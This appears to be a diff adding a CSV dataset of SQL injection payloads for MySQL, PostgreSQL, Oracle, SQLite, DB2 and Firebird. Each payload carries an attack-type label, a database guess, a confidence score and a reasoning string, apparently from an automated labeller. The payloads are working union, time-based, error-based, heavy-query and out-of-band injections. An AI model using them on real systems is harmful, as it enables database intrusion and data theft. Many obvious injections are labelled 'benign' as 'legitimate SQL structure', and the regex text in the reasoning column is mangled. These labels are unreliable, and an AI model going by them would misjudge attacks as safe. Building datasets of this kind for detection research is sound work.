@@ -1,0 +1,201 @@
+id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
+24544,"1 ) ) as henn where 9980 = 9980 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24545,"1' ) where 3375 = 3375 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24546,"1'|| ( select 'akye' where 9242 = 9242 union all select null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24547,"1"" where 2235 = 2235 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24548,"1"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""tfso"" = ""tfso",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24549,-6086' ) ) or ( 6719 = 7280 ) *7280 and ( ( 'ozbj' = 'ozbj,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24550,"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24551,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # qmkh",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24552,1%' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24553,"1 ) as kjsd where 1670 = 1670 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24554,"-2987"" ) as iyob where 7827 = 7827 or ( 8459 = 8459 ) *4906--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24555,"-6368 ) ) union all select 4646,4646,4646,4646,4646,4646,4646--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24556,-6947' ) ) as qqjp where 6700 = 6700 union all select 6700#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24557,-2604 ) ) as sekb where 6897 = 6897 or 1000 = 7683,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24558,"1"" union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24559,1' ) ) ) rlike ( select ( case when ( 4076 = 4881 ) then 1 else 0x28 end ) ) and ( ( ( 'grzs' = 'grzs,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24560,-2751 where 6334 = 6334 or ( 9668 = 5845 ) *5845--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24561,1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24562,1' ) ) as jbcd where 9078 = 9078 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
+24563,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
+24564,"select count ( * ) from generate_series ( 1,5000000 ) and ( 'qpdu' = 'qpdu",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24565,"1%' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24566,-3246%' union all select 4012#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24567,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""rfam"" like ""rfam",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24568,"1'+ ( select dnxi where 5850 = 5850 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24569,-6353%' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24570,"1'+ ( select 'tyuz' where 3957 = 3957 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24571,"1"" where 9461 = 9461",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24572,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24573,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'qgdv' = 'qgdv",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24574,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24575,1' ) ) as txxn where 7884 = 7884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24576,1 where 6173 = 6173,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24577,"1 where 6383 = 6383 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24578,"1%"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24579,"1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24580,select ( case when ( 4297 = 9086 ) then 4297 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24581,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'cqrp' = 'cqrp",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24582,"1"" ) as eomu where 6599 = 6599",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24583,1'+ ( select 'wyed' where 9896 = 9896,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24584,"1'+ ( select oogh where 1167 = 1167 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24585,"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24586,"1'+ ( select jrmz where 4762 = 4762 and elt ( 9588 = 9794,9794 ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24587,"1"" ) ) union all select null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24588,"-2263' ) where 7931 = 7931 union all select 7931,7931,7931--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24589,-5585%' ) ) ) or 6990 = 7727,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24590,-2300 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24591,"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""wwaq"" = ""wwaq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24592,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'swua' like 'swua",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24593,"1%"" ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24594,end and 'wdce' = 'wdce,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24595,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'beoh' = 'beoh",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24596,"-5998"" ) as gazd where 2814 = 2814 union all select 2814,2814,2814,2814,2814,2814,2814--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24597,"1 where 2278 = 2278 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24598,1' and sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24599,1%' ) ) and 7160 = 7249--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24600,"1 ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 3950 = 3950",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24601,"1"" ) ) union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24602,1' ) ) as zbkp where 1720 = 1720 and 4110 = 6748#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24603,1 ) ) as smtf where 5829 = 5829,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24604,"-2460%"" ) or ( 2660 = 5767 ) *5767 and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24605,1' ) ) as myws where 5274 = 5274,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24606,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""%"" = """,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24607,"-5702' ) ) ) union all select 7806,7806,7806,7806,7806--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24608,"1%' ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24609,"1' ) where 3255 = 3255 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24610,"1"" ) ) as pafp where 6770 = 6770 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24611,"-9896"" ) ) ) union all select 4073,4073,4073,4073,4073#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24612,"1 ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 7338 = 7338",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24613,1'+ ( select 'yahd' where 5850 = 5850,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24614,-8636' ) ) ) or 4301 = 7212--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24615,"1 ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 6659 = 6659",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
+24616,select sleep ( 5 ) and ( ( ( 'etzb' = 'etzb,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24617,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""bqfj"" like ""bqfj",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24618,select ( case when ( 3414 = 8741 ) then 3414 else 3414* ( select 3414 from information_schema.character_sets ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24619,"1"" where 9669 = 9669",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24620,"1%' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24621,1%' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( '%' = ',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24622,-1796' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lpuw' like 'lpuw,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
+24623,-7246'|| ( select 'qchp' from dual where 8317 = 8317 order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24624,"1' or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24625,"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24626,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'mhvy' like 'mhvy",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24627,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
+24628,1 ) ) as gocb where 4335 = 4335,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24629,"1%' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24630,"1"" ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24631,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'yvbb' = 'yvbb",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24632,"1"" and 7533 = 7533",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24633,"1 ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24634,"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'weof' = 'weof",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24635,1'+ ( select 'uetb' where 6468 = 6468,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24636,"1'+ ( select lhho where 7579 = 7579 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24637,"1 where 1886 = 1886 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24638,"-1844"" where 7948 = 7948 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24639,"1"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24640,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'btnl' = 'btnl",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24641,"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24642,"1"" ) where 6859 = 6859 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24643,"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
+24644,"select * from generate_series ( 2382,2382,case when ( 2382 = 4352 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24645,"1"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24646,select sleep ( 5 ) and ( ( ( 'thqr' like 'thqr,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24647,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24648,"1 ) ) ) union all select null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24649,"-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24650,"1"" ) union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24651,"1%"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""%"" = """,heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24652,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""gddl"" like ""gddl",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24653,"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24654,"1 ) as fgqe where 1526 = 1526 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24655,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'wesl' = 'wesl",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24656,"1' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'bfrq' like 'bfrq",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24657,-6802 ) as coyv where 5693 = 5693 or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24658,"-3817"" ) as vugz where 3064 = 3064 or 9323 = 9323#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24659,( select * from ( select ( sleep ( 5 ) ) ) srmq ) -- mmjk,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24660,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24661,"1%"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24662,"1"" ) and sleep ( 5 ) and ( ""fsuf"" like ""fsuf",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24663,"1"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""prhp"" = ""prhp",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24664,"1 where 9279 = 9279 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
+24665,1%' ) ) and 3721 = 2597#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24666,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""woun"" like ""woun",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24667,"1"" ) ) as yfpl where 4820 = 4820 union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24668,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ),time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
+24669,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24670,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 3124 = 3124,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24671,"1"" ) ) as wfne where 8933 = 8933",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24672,-7633' ) as aslj where 2317 = 2317 or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24673,"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24674,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'wgpg' like 'wgpg",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24675,1' ) and ( 2763 = 4004 ) *4004 and ( 'dtts' = 'dtts,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24676,"1"" ) as nyui where 2511 = 2511",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24677,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'qdhz' = 'qdhz",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24678,"1'+ ( select 'arqt' where 2336 = 2336 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24679,"-1401"" ) ) union all select 3480,3480,3480,3480,3480,3480--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24680,end and ( ( ( 'ycte' = 'ycte,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24681,"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""cyyh"" = ""cyyh",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24682,"select sleep ( 5 ) and ( ( ( ""uvzc"" like ""uvzc",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24683,-8010' or ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24684,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""icow"" like ""icow",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
+24685,select ( case when ( 5847 = 2826 ) then 5847 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24686,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ibav' = 'ibav",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24687,"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
